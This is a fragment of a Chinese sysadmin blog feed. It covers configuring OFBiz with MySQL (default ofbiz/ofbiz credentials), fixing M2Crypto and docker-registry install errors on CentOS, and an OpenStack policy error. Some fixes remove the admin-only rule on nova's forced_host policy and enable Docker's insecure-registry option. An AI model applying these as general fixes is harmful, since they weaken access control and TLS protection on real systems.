class="keyword">drop</span>-fk-use-<span class="keyword">foreign</span>-key-keyword=&quot;true&quot;</span><br><span class="line">        <span class="keyword">table</span>-<span class="keyword">type</span>=&quot;InnoDB&quot;</span><br><span class="line">        <span class="type">character</span>-<span class="keyword">set</span>=&quot;utf8&quot;</span><br><span class="line">        <span class="keyword">collate</span>=&quot;utf8_general_ci&quot;&gt;</span><br><span class="line">    &lt;<span class="keyword">read</span>-data reader-<span class="type">name</span>=&quot;tenant&quot;/&gt;</span><br><span class="line">    &lt;<span class="keyword">read</span>-data reader-<span class="type">name</span>=&quot;seed&quot;/&gt;</span><br><span class="line">    &lt;<span class="keyword">read</span>-data reader-<span class="type">name</span>=&quot;seed-initial&quot;/&gt;</span><br><span class="line">    &lt;<span class="keyword">read</span>-data reader-<span class="type">name</span>=&quot;demo&quot;/&gt;</span><br><span class="line">    &lt;<span class="keyword">read</span>-data reader-<span class="type">name</span>=&quot;ext&quot;/&gt;</span><br><span class="line">    &lt;<span class="keyword">read</span>-data reader-<span class="type">name</span>=&quot;ext-test&quot;/&gt;</span><br><span class="line">    &lt;<span class="keyword">read</span>-data reader-<span class="type">name</span>=&quot;ext-demo&quot;/&gt;</span><br><span class="line">    &lt;<span class="keyword">inline</span>-jdbc</span><br><span class="line">            jdbc-driver=&quot;com.mysql.jdbc.Driver&quot;</span><br><span class="line">            jdbc-uri=&quot;jdbc:mysql://127.0.0.1:3306/ofbiz?autoReconnect=true&quot;</span><br><span class="line">            jdbc-username=&quot;ofbiz&quot;</span><br><span class="line">            jdbc-<span class="keyword">password</span>=&quot;ofbiz&quot;</span><br><span class="line">            <span class="keyword">isolation</span>-<span class="keyword">level</span>=&quot;ReadCommitted&quot;</span><br><span class="line">            pool-minsize=&quot;2&quot;</span><br><span class="line">            pool-maxsize=&quot;250&quot;</span><br><span class="line">            <span class="type">time</span>-<span class="keyword">between</span>-eviction-runs-millis=&quot;600000&quot;/&gt;&lt;!<span class="comment">-- Please note that at least one person has experienced a problem with this value with MySQL</span></span><br><span class="line">            <span class="keyword">and</span> had <span class="keyword">to</span> <span class="keyword">set</span> it <span class="keyword">to</span> <span class="number">-1</span> <span class="keyword">in</span> <span class="keyword">order</span> <span class="keyword">to</span> avoid this issue.</span><br><span class="line">            <span class="keyword">For</span> more look at http://markmail.org/thread/<span class="number">5</span>sivpykv7xkl66px <span class="keyword">and</span> http://commons.apache.org/dbcp/<span class="keyword">configuration</span>.html<span class="comment">--&gt;</span></span><br><span class="line">    &lt;!<span class="comment">-- &lt;jndi-jdbc jndi-server-name=&quot;localjndi&quot; jndi-name=&quot;java:/MySqlDataSource&quot; isolation-level=&quot;Serializable&quot;/&gt; --&gt;</span></span><br><span class="line">&lt;/datasource&gt;</span><br><span class="line">    </span><br><span class="line"> &lt;datasource <span class="type">name</span>=&quot;localmysqlolap&quot;</span><br><span class="line">        helper-<span class="keyword">class</span>=&quot;org.ofbiz.entity.datasource.GenericHelperDAO&quot;</span><br><span class="line">        field-<span class="keyword">type</span>-<span class="type">name</span>=&quot;mysql&quot;</span><br><span class="line">        <span class="keyword">check</span>-<span class="keyword">on</span>-start=&quot;true&quot;</span><br><span class="line">        <span class="keyword">add</span>-missing-<span class="keyword">on</span>-start=&quot;true&quot;</span><br><span class="line">        <span class="keyword">check</span>-pks-<span class="keyword">on</span>-start=&quot;false&quot;</span><br><span class="line">        use-<span class="keyword">foreign</span>-keys=&quot;true&quot;</span><br><span class="line">        <span class="keyword">join</span>-style=&quot;ansi-no-parenthesis&quot;</span><br><span class="line">        <span class="keyword">alias</span>-<span class="keyword">view</span>-<span class="keyword">columns</span>=&quot;false&quot;</span><br><span class="line">        <span class="keyword">drop</span>-fk-use-<span class="keyword">foreign</span>-key-keyword=&quot;true&quot;</span><br><span class="line">        <span class="keyword">table</span>-<span class="keyword">type</span>=&quot;InnoDB&quot;</span><br><span class="line">        <span class="type">character</span>-<span class="keyword">set</span>=&quot;utf8&quot;</span><br><span class="line">        <span class="keyword">collate</span>=&quot;utf8_general_ci&quot;&gt;</span><br><span class="line">    &lt;<span class="keyword">read</span>-data reader-<span class="type">name</span>=&quot;tenant&quot;/&gt;</span><br><span class="line">    &lt;<span class="keyword">read</span>-data reader-<span class="type">name</span>=&quot;seed&quot;/&gt;</span><br><span class="line">    &lt;<span class="keyword">read</span>-data reader-<span class="type">name</span>=&quot;seed-initial&quot;/&gt;</span><br><span class="line">    &lt;<span class="keyword">read</span>-data reader-<span class="type">name</span>=&quot;demo&quot;/&gt;</span><br><span class="line">    &lt;<span class="keyword">read</span>-data reader-<span class="type">name</span>=&quot;ext&quot;/&gt;</span><br><span class="line">    &lt;<span class="keyword">read</span>-data reader-<span class="type">name</span>=&quot;ext-test&quot;/&gt;</span><br><span class="line">    &lt;<span class="keyword">read</span>-data reader-<span class="type">name</span>=&quot;ext-demo&quot;/&gt;</span><br><span class="line">    &lt;<span class="keyword">inline</span>-jdbc</span><br><span class="line">            jdbc-driver=&quot;com.mysql.jdbc.Driver&quot;</span><br><span class="line">            jdbc-uri=&quot;jdbc:mysql://127.0.0.1:3306/ofbizolap?autoReconnect=true&quot;</span><br><span class="line">            jdbc-username=&quot;ofbiz&quot;</span><br><span class="line">            jdbc-<span class="keyword">password</span>=&quot;ofbiz&quot;</span><br><span class="line">            <span class="keyword">isolation</span>-<span class="keyword">level</span>=&quot;ReadCommitted&quot;</span><br><span class="line">            pool-minsize=&quot;2&quot;</span><br><span class="line">            pool-maxsize=&quot;250&quot;</span><br><span class="line">            <span class="type">time</span>-<span class="keyword">between</span>-eviction-runs-millis=&quot;600000&quot;/&gt;&lt;!<span class="comment">-- Please note that at least one person has experienced a problem with this value with MySQL</span></span><br><span class="line">            <span class="keyword">and</span> had <span class="keyword">to</span> <span class="keyword">set</span> it <span class="keyword">to</span> <span class="number">-1</span> <span class="keyword">in</span> <span class="keyword">order</span> <span class="keyword">to</span> avoid this issue.</span><br><span class="line">            <span class="keyword">For</span> more look at http://markmail.org/thread/<span class="number">5</span>sivpykv7xkl66px <span class="keyword">and</span> http://commons.apache.org/dbcp/<span class="keyword">configuration</span>.html<span class="comment">--&gt;</span></span><br><span class="line">     &lt;!<span class="comment">-- &lt;jndi-jdbc jndi-server-name=&quot;localjndi&quot; jndi-name=&quot;java:/MySqlDataSource&quot; isolation-level=&quot;Serializable&quot;/&gt; --&gt;</span></span><br><span class="line">&lt;/datasource&gt;</span><br><span class="line">    </span><br><span class="line">&lt;datasource <span class="type">name</span>=&quot;localmysqltenant&quot;</span><br><span class="line">        helper-<span class="keyword">class</span>=&quot;org.ofbiz.entity.datasource.GenericHelperDAO&quot;</span><br><span class="line">        field-<span class="keyword">type</span>-<span class="type">name</span>=&quot;mysql&quot;</span><br><span class="line">        <span class="keyword">check</span>-<span class="keyword">on</span>-start=&quot;true&quot;</span><br><span class="line">        <span class="keyword">add</span>-missing-<span class="keyword">on</span>-start=&quot;true&quot;</span><br><span class="line">        <span class="keyword">check</span>-pks-<span class="keyword">on</span>-start=&quot;false&quot;</span><br><span class="line">        use-<span class="keyword">foreign</span>-keys=&quot;true&quot;</span><br><span class="line">        <span class="keyword">join</span>-style=&quot;ansi-no-parenthesis&quot;</span><br><span class="line">        <span class="keyword">alias</span>-<span class="keyword">view</span>-<span class="keyword">columns</span>=&quot;false&quot;</span><br><span class="line">        <span class="keyword">drop</span>-fk-use-<span class="keyword">foreign</span>-key-keyword=&quot;true&quot;</span><br><span class="line">        <span class="keyword">table</span>-<span class="keyword">type</span>=&quot;InnoDB&quot;</span><br><span class="line">        <span class="type">character</span>-aracter-<span class="keyword">set</span>=&quot;utf8&quot;</span><br><span class="line">        <span class="keyword">collate</span>=&quot;utf8_general_ci&quot;&gt;</span><br><span class="line">    &lt;<span class="keyword">read</span>-data reader-<span class="type">name</span>=&quot;tenant&quot;/&gt;</span><br><span class="line">    &lt;<span class="keyword">read</span>-data reader-<span class="type">name</span>=&quot;seed&quot;/&gt;</span><br><span class="line">    &lt;<span class="keyword">read</span>-data reader-<span class="type">name</span>=&quot;seed-initial&quot;/&gt;</span><br><span class="line">    &lt;<span class="keyword">read</span>-data reader-<span class="type">name</span>=&quot;demo&quot;/&gt;</span><br><span class="line">    &lt;<span class="keyword">read</span>-data reader-<span class="type">name</span>=&quot;ext&quot;/&gt;</span><br><span class="line">    &lt;<span class="keyword">read</span>-data reader-<span class="type">name</span>=&quot;ext-test&quot;/&gt;</span><br><span class="line">    &lt;<span class="keyword">read</span>-data reader-<span class="type">name</span>=&quot;ext-demo&quot;/&gt;</span><br><span class="line">    &lt;<span class="keyword">inline</span>-jdbc</span><br><span class="line">            jdbc-driver=&quot;com.mysql.jdbc.Driver&quot;</span><br><span class="line">            jdbc-uri=&quot;jdbc:mysql://127.0.0.1:3306/ofbiztenant?autoReconnect=true&quot;</span><br><span class="line">            jdbc-username=&quot;ofbiz&quot;</span><br><span class="line">            jdbc-<span class="keyword">password</span>=&quot;ofbiz&quot;</span><br><span class="line">            <span class="keyword">isolation</span>-<span class="keyword">level</span>=&quot;ReadCommitted&quot;</span><br><span class="line">            pool-minsize=&quot;2&quot;</span><br><span class="line">            pool-maxsize=&quot;250&quot;</span><br><span class="line">            <span class="type">time</span>-<span class="keyword">between</span>-eviction-runs-millis=&quot;600000&quot;/&gt;&lt;!<span class="comment">-- Please note that at least one person has experienced a problem with this value with MySQL</span></span><br><span class="line">            <span class="keyword">and</span> had <span class="keyword">to</span> <span class="keyword">set</span> it <span class="keyword">to</span> <span class="number">-1</span> <span class="keyword">in</span> <span class="keyword">order</span> <span class="keyword">to</span> avoid this issue.</span><br><span class="line">            <span class="keyword">For</span> more look at http://markmail.org/thread/<span class="number">5</span>sivpykv7xkl66px <span class="keyword">and</span> http://commons.apache.org/dbcp/<span class="keyword">configuration</span>.html<span class="comment">--&gt;</span></span><br><span class="line">    &lt;!<span class="comment">-- &lt;jndi-jdbc jndi-server-name=&quot;localjndi&quot; jndi-name=&quot;java:/MySqlDataSource&quot; isolation-level=&quot;Serializable&quot;/&gt; --&gt;</span></span><br><span class="line">&lt;/datasource&gt;</span><br></pre></td></tr></table></figure><p>复制 mysql.jar 文件到指定目录 mysql.jar 下载地址：<a href="http://dev.mysql.com/downloads/connector/j/">http://dev.mysql.com/downloads/connector/j/</a> 复制mysql.jar到lib目录 </p><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">cp mysql-connector-java-<span class="number">5.1</span>.<span class="number">36</span>-bin.jar ofbiz_HOME<span class="regexp">/framework/</span>base<span class="regexp">/lib/</span>&lt;/pre&gt;</span><br></pre></td></tr></table></figure><h3 id="3-导入数据，启动ofbiz"><a href="#3-导入数据，启动ofbiz" class="headerlink" title="3. 导入数据，启动ofbiz"></a>3. 导入数据，启动ofbiz</h3><figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line"><span class="keyword">cd</span> ofbiz_HOME</span><br><span class="line"><span class="string">./ant</span> load-demo           <span class="comment">#导入demo数据</span></span><br><span class="line"><span class="string">./ant</span> start               <span class="comment">#启动ofbiz</span></span><br></pre></td></tr></table></figure><p>至此已经完成ofbiz使用mysql数据库的配置，其他操作请参考ofbiz目录下的README文件</p>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ofbiz </tag>
            
            <tag> mysql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>配置docker本地仓库遇到的一些问题</title>
      <link href="docker/configure_docker_local_repository.html"/>
      <url>docker/configure_docker_local_repository.html</url>
      
        <content type="html"><![CDATA[<p>配置docker本地仓库的方法参考<a href="http://dockerpool.com/static/books/docker_practice/repository/local_repo.html">：http://dockerpool.com/static/books/docker_practice/repository/local_repo.html</a></p><p>在执行一下命令的时候遇到一些问题，记录如下：</p><h2 id="000"><a href="#000" class="headerlink" title="000"></a>000</h2><figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="comment"># pip install docker-registry</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">Searching</span> for M<span class="number">2</span>Crypto==<span class="number">0</span>.<span class="number">22</span>.<span class="number">3</span></span><br><span class="line"><span class="attribute">Reading</span> https://pypi.python.org/simple/M<span class="number">2</span>Crypto/</span><br><span class="line"><span class="attribute">Best</span> match: M<span class="number">2</span>Crypto <span class="number">0</span>.<span class="number">22</span>.<span class="number">3</span></span><br><span class="line"><span class="attribute">Downloading</span> https://pypi.python.org/packages/source/M/M<span class="number">2</span>Crypto/M<span class="number">2</span>Crypto-<span class="number">0</span>.<span class="number">22</span>.<span class="number">3</span>.tar.gz#md<span class="number">5</span>=<span class="number">573</span>f<span class="number">21</span>aaac<span class="number">7</span>d<span class="number">5</span>c<span class="number">9549798</span>e<span class="number">72</span>ffcefedd</span><br><span class="line"><span class="attribute">Processing</span> M<span class="number">2</span>Crypto-<span class="number">0</span>.<span class="number">22</span>.<span class="number">3</span>.tar.gz</span><br><span class="line"><span class="attribute">Writing</span> /tmp/easy_install-vVPR<span class="number">1</span>Z/M<span class="number">2</span>Crypto-<span class="number">0</span>.<span class="number">22</span>.<span class="number">3</span>/setup.cfg</span><br><span class="line"><span class="attribute">Running</span> M<span class="number">2</span>Crypto-<span class="number">0</span>.<span class="number">22</span>.<span class="number">3</span>/setup.py -q bdist_egg --dist-dir /tmp/easy_install-vVPR<span class="number">1</span>Z/M<span class="number">2</span>Crypto-<span class="number">0</span>.<span class="number">22</span>.<span class="number">3</span>/egg-dist-tmp-<span class="number">3</span>c<span class="number">7</span>TJ<span class="number">3</span></span><br><span class="line"><span class="attribute">SWIG</span>/_m<span class="number">2</span>crypto.i:<span class="number">30</span>: Error: Unable to find &#x27;openssl/opensslv.h&#x27;</span><br><span class="line"><span class="attribute">SWIG</span>/_m<span class="number">2</span>crypto.i:<span class="number">33</span>: Error: Unable to find &#x27;openssl/safestack.h&#x27;</span><br><span class="line"><span class="attribute">SWIG</span>/_evp.i:<span class="number">12</span>: Error: Unable to find &#x27;openssl/opensslconf.h&#x27;</span><br><span class="line"><span class="attribute">SWIG</span>/_ec.i:<span class="number">7</span>: Error: Unable to find &#x27;openssl/opensslconf.h&#x27;</span><br><span class="line"><span class="attribute">error</span>: Setup script exited with error: command &#x27;swig&#x27; failed with exit status</span><br></pre></td></tr></table></figure><p>解决办法是安装 openssl-devel：</p><figure class="highlight vala"><table><tr><td class="code"><pre><span class="line"><span class="meta"># yum install -y openssl-devel.x86_64</span></span><br></pre></td></tr></table></figure><span id="more"></span><h2 id="001"><a href="#001" class="headerlink" title="001"></a>001</h2><p>重新执行 pip install docker-registry </p><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">Searching <span class="keyword">for</span> M2Crypto==<span class="number">0.22</span>.<span class="number">3</span></span><br><span class="line">Reading https:<span class="regexp">//</span>pypi.python.org<span class="regexp">/simple/</span>M2Crypto/</span><br><span class="line">Best match: M2Crypto <span class="number">0.22</span>.<span class="number">3</span></span><br><span class="line">Downloading https:<span class="regexp">//</span>pypi.python.org<span class="regexp">/packages/</span>source<span class="regexp">/M/</span>M2Crypto/M2Crypto-<span class="number">0.22</span>.<span class="number">3</span>.tar.gz<span class="comment">#md5=573f21aaac7d5c9549798e72ffcefedd</span></span><br><span class="line">Processing M2Crypto-<span class="number">0.22</span>.<span class="number">3</span>.tar.gz</span><br><span class="line">Writing <span class="regexp">/tmp/</span>easy_install-<span class="number">5</span>hkA4l<span class="regexp">/M2Crypto-0.22.3/</span>setup.cfg</span><br><span class="line">Running M2Crypto-<span class="number">0.22</span>.<span class="number">3</span><span class="regexp">/setup.py -q bdist_egg --dist-dir /</span>tmp<span class="regexp">/easy_install-5hkA4l/</span>M2Crypto-<span class="number">0.22</span>.<span class="number">3</span>/egg-dist-tmp-pZ_OGN</span><br><span class="line"><span class="regexp">/usr/i</span>nclude<span class="regexp">/openssl/</span>opensslconf.h:<span class="number">36</span>: Error: CPP <span class="comment">#error &quot;&quot;This openssl-devel package does not work your architecture?&quot;&quot;. Use the -cpperraswarn option to continue swig processing.</span></span><br><span class="line">error: Setup script exited with error: command <span class="string">&#x27;swig&#x27;</span> failed with <span class="keyword">exit</span> status </span><br></pre></td></tr></table></figure><p>解决办法是手动安装 M2Crypto 0.22.3 （M2Crypto 0.22.3在centos7上安装会有一些问题需要借助脚本）</p><h3 id="1-下载-M2Crypto-0-22-3-tar-gz"><a href="#1-下载-M2Crypto-0-22-3-tar-gz" class="headerlink" title="1. 下载 M2Crypto-0.22.3.tar.gz"></a>1. 下载 M2Crypto-0.22.3.tar.gz</h3><figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">wget</span> https://pypi.python.org/packages/source/M/M<span class="number">2</span>Crypto/M<span class="number">2</span>Crypto-<span class="number">0</span>.<span class="number">22</span>.<span class="number">3</span>.tar.gz   #下载源码</span><br><span class="line"><span class="attribute">tar</span> zxvf M<span class="number">2</span>Crypto/M<span class="number">2</span>Crypto-<span class="number">0</span>.<span class="number">22</span>.<span class="number">3</span>.tar.gz    # 解压</span><br><span class="line"><span class="attribute">cd</span> M<span class="number">2</span>Crypto-<span class="number">0</span>.<span class="number">22</span>.<span class="number">3</span></span><br></pre></td></tr></table></figure><h3 id="2-然后创建安装脚本，内容如下"><a href="#2-然后创建安装脚本，内容如下" class="headerlink" title="2. 然后创建安装脚本，内容如下:"></a>2. 然后创建安装脚本，内容如下:</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># vim fedora_setup.sh</span></span><br><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="comment"># This script is meant to work around the differences on Fedora Core-based# distributions (Redhat, CentOS, ...) compared to other common Linux</span></span><br><span class="line"><span class="comment"># distributions.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Usage: ./fedora_setup.sh [setup.py options]</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"></span><br><span class="line">arch=`uname -m`</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> SWIG/_&#123;ec,evp&#125;.i; <span class="keyword">do</span></span><br><span class="line">  sed -i -e <span class="string">&quot;s/opensslconf\./opensslconf-<span class="variable">$&#123;arch&#125;</span>\./&quot;</span> <span class="string">&quot;<span class="variable">$i</span>&quot;</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line">SWIG_FEATURES=-cpperraswarn python setup.py $*</span><br></pre></td></tr></table></figure><h3 id="3-然后为脚本添加执行权限，执行脚本，并安装M2Crypto-0-22-3"><a href="#3-然后为脚本添加执行权限，执行脚本，并安装M2Crypto-0-22-3" class="headerlink" title="3. 然后为脚本添加执行权限，执行脚本，并安装M2Crypto 0.22.3"></a>3. 然后为脚本添加执行权限，执行脚本，并安装M2Crypto 0.22.3</h3><figure class="highlight vala"><table><tr><td class="code"><pre><span class="line"><span class="meta"># chmod +x fedora_setup.sh</span></span><br><span class="line"><span class="meta"># ./fedora_setup.sh build</span></span><br><span class="line"><span class="meta"># python setup.py install</span></span><br></pre></td></tr></table></figure><p>至此可以完成安装，需要注意的是私有仓库的配置文件 config_sample.yml在以下路径  </p><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="regexp">/usr/</span>lib<span class="regexp">/python2.7/</span>site-packages<span class="regexp">/docker_registry-1.0.0_dev-py2.7.egg/</span>config</span><br></pre></td></tr></table></figure><h2 id="002"><a href="#002" class="headerlink" title="002"></a>002</h2><p>配置完成后启动服务，push镜像的时候又有如下错误：</p><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">docker pull <span class="number">172.16</span>.<span class="number">18.159</span>:<span class="number">5000</span>/ubuntu:<span class="number">12.04</span></span><br><span class="line">Error: Invalid registry endpoint https:<span class="regexp">//</span><span class="number">172.16</span>.<span class="number">18.159</span>:<span class="number">5000</span><span class="regexp">/v1/</span>: Get https:<span class="regexp">//</span><span class="number">172.16</span>.<span class="number">18.159</span>:<span class="number">5000</span><span class="regexp">/v1/</span>_ping: EOF. If this private registry supports only HTTP or HTTPS with an unknown CA certificate, please add `--insecure-registry http:<span class="regexp">//</span><span class="number">172.16</span>.<span class="number">18.159</span>:<span class="number">5000</span>` to the daemon<span class="string">&#x27;s arguments. In the case of HTTPS, if you have access to the registry&#x27;</span>s CA certificate, no need <span class="keyword">for</span> the flag; simply place the CA certificate at <span class="regexp">/etc/</span>docker<span class="regexp">/certs.d/</span>http:<span class="regexp">//</span><span class="number">172.16</span>.<span class="number">18.159</span>:<span class="number">5000</span>/ca.crt</span><br></pre></td></tr></table></figure><p>解决方法是在docker的配置文件里面OPTIONS添加 –insecure-registry <a href="http://172.16.18.159:5000/">http://172.16.18.159:5000</a> 选项</p><figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="comment"># /etc/sysconfig/docker</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Modify these options if you want to change the way the docker daemon runs</span></span><br><span class="line"><span class="attr">OPTIONS</span>=<span class="string">&#x27;--selinux-enabled --insecure-registry 172.16.18.159:5000&#x27;</span></span><br><span class="line"><span class="attr">DOCKER_CERT_PATH</span>=/etc/docker</span><br></pre></td></tr></table></figure><p>然后重启docker服务：</p><figure class="highlight vala"><table><tr><td class="code"><pre><span class="line"><span class="meta"># systemctl restart docker</span></span><br></pre></td></tr></table></figure><p>至此错误全部解决，本地仓库配置成功</p>]]></content>
      
      
      <categories>
          
          <category> docker </category>
          
      </categories>
      
      
        <tags>
            
            <tag> docker </tag>
            
            <tag> repository </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>openstack tenant指定availability-zone启动虚拟机报错</title>
      <link href="openstack/openstack-tenant-specil-availability-zone.html"/>
      <url>openstack/openstack-tenant-specil-availability-zone.html</url>
      
        <content type="html"><![CDATA[<p>在admin租户下使用 nova boot  –availability-zone 在指定的节点上启动虚拟机正常</p><p>可是当在非admin租户下指定 –availability-zone 启动虚拟机报错</p><figure class="highlight subunit"><table><tr><td class="code"><pre><span class="line"># nova boot --flavor m1.tiny --image  cirros --nic net-id=65758d11<span class="string">-4027</span><span class="string">-4</span>b33<span class="string">-9</span>a8f-a5a215bb89c0 --availability-zone nova:vgw test-vgw</span><br><span class="line"><span class="keyword">ERROR: </span>Policy doesn&#x27;t allow compute:create:forced_host to be performed. (HTTP 403) (Request-ID: req<span class="string">-42</span>f48090-e0eb<span class="string">-4</span>ed0<span class="string">-8493</span><span class="string">-99</span>b06d1ce02d)</span><br></pre></td></tr></table></figure><span id="more"></span><p>加–debug选项，看到如下报错信息</p><figure class="highlight stata"><table><tr><td class="code"><pre><span class="line">INFO (connectionpool:203) Starting new HTTP connection (1): 172.16.85.129</span><br><span class="line">DEBUG (connectionpool:295) <span class="string">&quot;POST /v1.1/bdd28cc0c15245adae5455a67118bb17/servers HTTP/1.1&quot;</span> 403 107</span><br><span class="line">RESP: [403] &#123;&#x27;date&#x27;: &#x27;Fri, 19 Jun 2015 04:45:54 GMT&#x27;, &#x27;content-length&#x27;: &#x27;107&#x27;, &#x27;content-<span class="keyword">type</span>&#x27;: &#x27;application/json; charset=UTF-8&#x27;, &#x27;x-compute-request-id&#x27;: &#x27;req-ed4a06fc-512e-4c5a-9f99-0b7304f817d0&#x27;&#125;</span><br><span class="line">RESP BODY: &#123;<span class="string">&quot;forbidden&quot;</span>: &#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;Policy doesn&#x27;t allow compute:create:forced_host to be performed.&quot;</span>, <span class="string">&quot;code&quot;</span>: 403&#125;&#125;</span><br><span class="line"></span><br><span class="line">DEBUG (<span class="keyword">shell</span>:783) Policy doesn&#x27;t allow compute:create:forced_host to be performed. (HTTP 403) (Request-ID: req-ed4a06fc-512e-4c5a-9f99-0b7304f817d0)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  <span class="keyword">File</span> <span class="string">&quot;/usr/lib/python2.6/site-packages/novaclient/shell.py&quot;</span>, <span class="keyword">line</span> 780, <span class="keyword">in</span> main</span><br><span class="line">    OpenStackComputeShell().main(map(strutils.safe_decode, sys.argv[1:]))</span><br><span class="line">  <span class="keyword">File</span> <span class="string">&quot;/usr/lib/python2.6/site-packages/novaclient/shell.py&quot;</span>, <span class="keyword">line</span> 716, <span class="keyword">in</span> main</span><br><span class="line">    <span class="keyword">args</span>.func(self.<span class="keyword">cs</span>, <span class="keyword">args</span>)</span><br><span class="line">  <span class="keyword">File</span> <span class="string">&quot;/usr/lib/python2.6/site-packages/novaclient/v1_1/shell.py&quot;</span>, <span class="keyword">line</span> 433, <span class="keyword">in</span> do_boot</span><br><span class="line">    server = <span class="keyword">cs</span>.servers.create(*boot_args, **boot_kwargs)</span><br><span class="line">  <span class="keyword">File</span> <span class="string">&quot;/usr/lib/python2.6/site-packages/novaclient/v1_1/servers.py&quot;</span>, <span class="keyword">line</span> 871, <span class="keyword">in</span> create</span><br><span class="line"><span class="comment">    **boot_kwargs)</span></span><br><span class="line">  <span class="keyword">File</span> <span class="string">&quot;/usr/lib/python2.6/site-packages/novaclient/v1_1/servers.py&quot;</span>, <span class="keyword">line</span> 534, <span class="keyword">in</span> _boot</span><br><span class="line">    return_raw=return_raw, **kwargs)</span><br><span class="line">  <span class="keyword">File</span> <span class="string">&quot;/usr/lib/python2.6/site-packages/novaclient/base.py&quot;</span>, <span class="keyword">line</span> 152, <span class="keyword">in</span> _create</span><br><span class="line">    _resp, body = self.api.client.<span class="keyword">post</span>(url, body=body)</span><br><span class="line">  <span class="keyword">File</span> <span class="string">&quot;/usr/lib/python2.6/site-packages/novaclient/client.py&quot;</span>, <span class="keyword">line</span> 312, <span class="keyword">in</span> <span class="keyword">post</span></span><br><span class="line">    <span class="keyword">return</span> self._cs_request(url, &#x27;<span class="keyword">POST</span>&#x27;, **kwargs)</span><br><span class="line">  <span class="keyword">File</span> <span class="string">&quot;/usr/lib/python2.6/site-packages/novaclient/client.py&quot;</span>, <span class="keyword">line</span> 286, <span class="keyword">in</span> _cs_request</span><br><span class="line"><span class="comment">    **kwargs)</span></span><br><span class="line">  <span class="keyword">File</span> <span class="string">&quot;/usr/lib/python2.6/site-packages/novaclient/client.py&quot;</span>, <span class="keyword">line</span> 268, <span class="keyword">in</span> _time_request</span><br><span class="line">    resp, body = self.request(url, method, **kwargs)</span><br><span class="line">  <span class="keyword">File</span> <span class="string">&quot;/usr/lib/python2.6/site-packages/novaclient/client.py&quot;</span>, <span class="keyword">line</span> 262, <span class="keyword">in</span> request</span><br><span class="line">    raise exceptions.from_response(resp, body, url, method)</span><br><span class="line">Forbidden: Policy doesn&#x27;t allow compute:create:forced_host to be performed. (HTTP 403) (Request-ID: req-ed4a06fc-512e-4c5a-9f99-0b7304f817d0)</span><br><span class="line"><span class="keyword">ERROR</span>: Policy doesn&#x27;t allow compute:create:forced_host to be performed. (HTTP 403) (Request-ID: req-ed4a06fc-512e-4c5a-9f99-0b7304f817d0)</span><br></pre></td></tr></table></figure><p>解决方法如下</p><figure class="highlight vala"><table><tr><td class="code"><pre><span class="line"><span class="meta"># vim /etc/nova/policy.json</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#change</span></span><br><span class="line"><span class="string">&quot;compute:create:forced_host&quot;</span>: <span class="string">&quot;is_admin:True&quot;</span>,</span><br><span class="line"><span class="meta">#to</span></span><br><span class="line"><span class="string">&quot;compute:create:forced_host&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br></pre></td></tr></table></figure><p>重启 nova 服务即可</p><figure class="highlight vala"><table><tr><td class="code"><pre><span class="line"><span class="meta"># openstack-service restart nova</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> openstack </category>
          
      </categories>
      
      
        <tags>
            
            <tag> openstack </tag>
            
            <tag> nova </tag>
            
            <tag> availability-zone </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>nova boot vm with &#39;--nic net-id=xxxx, v4-fixed-ip=xxx&#39; failed</title>
      <link href="python/nova-boot-vm-with-fix-ip-failed.html"/>
      <url>python/nova-boot-vm-with-fix-ip-failed.html</url>
      
        <content type="html"><![CDATA[<p>在juno上指定ip启动虚拟机会出错，查询日志，在/var/log/nova/nova-compute.log<br>里面有如下出错信息(拖动滚动条看最右边的)：</p><figure class="highlight subunit"><table><tr><td class="code"><pre><span class="line">2015<span class="string">-06</span><span class="string">-09</span> 05:53:41.966 19951 ERROR nova.compute.manager [-] [instance: d9058791<span class="string">-9971</span><span class="string">-4962</span><span class="string">-8</span>c18<span class="string">-5</span>fb3188355ab] Instance failed to spawn</span><br><span class="line">2015<span class="string">-06</span><span class="string">-09</span> 05:53:41.966 19951 TRACE nova.compute.manager [instance: d9058791<span class="string">-9971</span><span class="string">-4962</span><span class="string">-8</span>c18<span class="string">-5</span>fb3188355ab] Traceback (most recent call last):</span><br><span class="line">2015<span class="string">-06</span><span class="string">-09</span> 05:53:41.966 19951 TRACE nova.compute.manager [instance: d9058791<span class="string">-9971</span><span class="string">-4962</span><span class="string">-8</span>c18<span class="string">-5</span>fb3188355ab]   File &quot;/usr/lib/python2.7/site-packages/nova/compute/manager.py&quot;, line 2246, in _build_resources</span><br><span class="line">2015<span class="string">-06</span><span class="string">-09</span> 05:53:41.966 19951 TRACE nova.compute.manager [instance: d9058791<span class="string">-9971</span><span class="string">-4962</span><span class="string">-8</span>c18<span class="string">-5</span>fb3188355ab]     yield resources</span><br><span class="line">2015<span class="string">-06</span><span class="string">-09</span> 05:53:41.966 19951 TRACE nova.compute.manager [instance: d9058791<span class="string">-9971</span><span class="string">-4962</span><span class="string">-8</span>c18<span class="string">-5</span>fb3188355ab]   File &quot;/usr/lib/python2.7/site-packages/nova/compute/manager.py&quot;, line 2116, in _build_and_run_instance</span><br><span 